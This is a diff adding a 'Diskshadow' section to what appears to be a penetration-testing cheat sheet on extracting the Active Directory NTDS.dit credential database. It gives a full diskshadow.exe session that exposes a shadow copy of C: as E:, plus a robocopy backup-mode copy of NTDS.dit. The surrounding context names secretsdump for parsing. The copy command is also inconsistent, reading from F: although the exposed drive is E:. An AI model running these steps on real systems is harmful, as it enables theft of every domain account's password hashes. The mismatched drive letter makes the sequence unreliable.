@@ -64,6 +64,28 @@ vssadmin delete shadows /shadow=$ShadowCopyId
 Invoke-NinjaCopy.ps1 -Path "C:\Windows\NTDS\NTDS.dit" -LocalDestination "C:\Windows\Temp\ntds.dit.save"
 ```
 
+### Diskshadow
+The `diskshadow.exe` utility can be used to interface with the Volume Shadow Copy Service.
+```
+PS C:\Tools> diskshadow.exe
+Microsoft DiskShadow version 1.0
+Copyright (C) 2013 Microsoft Corporation                                                       
+On computer:  BABYDC,  12/22/2025 2:15:01 AM
+
+DISKSHADOW> set verbose on
+DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
+DISKSHADOW> set context persistent nowriters
+DISKSHADOW> add volume C: alias cdrive
+DISKSHADOW> create
+DISKSHADOW> expose %cdrive% E:
+DISKSHADOW> exit
+```
+
+We can then copy the `NTDS.dit` file directly from the `E:` drive.
+```
+PS C:\Tools> robocopy /B F:\Windows\NTDS .\ntds ntds.dit
+```
+
 ## 2. Parsing
 
 Once the required files are exfiltrated, they can be parsed by tools like [secretsdump](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) (Python, part of [Impacket](https://github.com/SecureAuthCorp/impacket/)) or [gosecretsdump](https://github.com/c-sto/gosecretsdump) (Go, faster for big files).
